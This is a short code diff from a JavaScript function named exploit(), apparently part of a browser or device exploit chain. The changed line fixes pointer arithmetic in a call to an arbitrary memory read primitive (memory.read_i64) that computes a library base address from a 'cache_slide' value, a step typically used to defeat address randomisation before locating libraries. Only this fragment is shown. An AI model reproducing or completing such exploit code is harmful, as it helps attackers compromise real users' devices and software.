@@ -699,7 +699,7 @@ function exploit(){
 
 
             };
-            var base = Add(memory.read_i64(imgs + m,0), cache_slide);
+            var base = Add(memory.read_i64(Add(imgs,m),0), cache_slide);
             alert("base" + base);
             
             if(opcode_libs.some(lib => strcmp(fn, lib)))
